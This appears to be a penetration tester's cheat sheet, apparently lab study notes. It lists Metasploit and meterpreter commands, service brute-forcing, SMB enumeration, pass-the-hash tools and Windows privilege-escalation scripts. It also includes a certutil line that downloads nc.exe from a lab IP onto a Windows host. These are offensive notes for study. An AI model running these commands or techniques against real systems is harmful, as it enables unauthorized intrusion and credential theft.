# TIPs and Tricks
TIPS:
- For banner grabbing Check nc -nv
- bruteforce Services: FTP, SSH, 
- if you have clear text password then you can use psexc.py script OR psexec metasploit module
- vsFTPd OR SMTP Linux to find accounts in system smtp_enum
- grep -rnw /usr -e "/home/student/message"  checking any occurance of this file in any other file
- run arp_scanner -r 192.168.89.0/24
# wordlists
/usr/share/metasploit-framework/data/wordllists/unix_passwords.txt OR common_passwords.txt
- /usr/share/webshells/

# Msfconsole
### meterpreter
- sysinfo
- getuid
- getprivs
- type shell for shell
### commands
- show
- search
- options
- add -h to get help
- search <name-service>
- search cve:2017 type:exploit platform:windows
- connect command
- loot
- notes
- hosts
- services
- vulns
- loot For credentials
- creds

## Tools 
# imp
- searchsploit flag -m to copy
- certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe to download file with windows cmd
## Windows
- always bruteforce administrator account
- narrow down your bruteforce via first identifying Username
## Windows usefull Commands
- net localgroup administrators
- whoami /priv
- net stop wampapache
### Windows
- smbclient -L <target-ip> -U vagrant
- smbmap -u -p -H <taerget-ip>
- enum4linux -u -p -U <taerget-ip> For SMB
- psexec.py also available in psexec For SMB
- Crackmapexec :: Pass the hash
- evil-winrm :: same to take access
- PowerUp.ps1 :: Windows COmmon Vulnerability Finder
- PowerSploit


## Linux
## Linux Usefull Commands
- grep -rnw /usr -e "/home/student/message"  checking any occurance of this file in any other file
- cat /etc/*issue OR cat /etc/*release to get distor version.
- uname -r Kernel versions
- locate
- tmux Terminal for Multiple Terminal in Single Terminal 
 - Usage: ctrl+b to create New Terminal ctrl+b+1/2/0 ctrl+b+Page_Up/Page_down for page up and down

## Services
- SSH 22
- SMB 445
- MySQL 3306
- FTP 21
